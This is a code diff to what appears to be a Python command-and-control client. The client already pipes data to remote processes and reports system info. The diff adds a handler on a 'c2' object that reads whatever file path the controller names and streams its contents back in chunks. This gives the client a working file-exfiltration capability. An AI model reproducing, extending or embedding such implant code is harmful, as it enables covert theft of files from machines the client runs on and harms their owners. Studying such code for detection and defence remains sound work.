@@ -5,6 +5,7 @@ import subprocess
 from platform import uname
 from threading import Thread
 from typing import IO
+from pathlib import Path
 
 from protocol import *
 
@@ -92,6 +93,25 @@ def handle(frame: ProcessPipeFrame, session: ProtocolSession):
     if process is None:
         return
     process.write_stdin(frame.data)
+
+
+@c2.handler(FileDownloadRequestFrame)
+def handler(frame: FileDownloadRequestFrame, session: ProtocolSession):
+    def target():
+        try:
+            path = Path(frame.file)
+            size = path.stat(follow_symlinks=True).st_size
+            with open(frame.file, 'rb') as f:
+                session.send(FileTransferStartFrame(frame.request_id, path.name, size))
+                while True:
+                    data = os.read(f.fileno(), frame.chunk_size)
+                    if data == b'':
+                        break
+                    session.send(FileTransferDataFrame(frame.request_id, data))
+                session.send(FileTransferCompleteFrame(frame.request_id))
+        except Exception:
+            session.send(FileTransferFailFrame(frame.request_id))
+    Thread(target=target).start()
 
 
 def send_system_info(session: ProtocolSession):
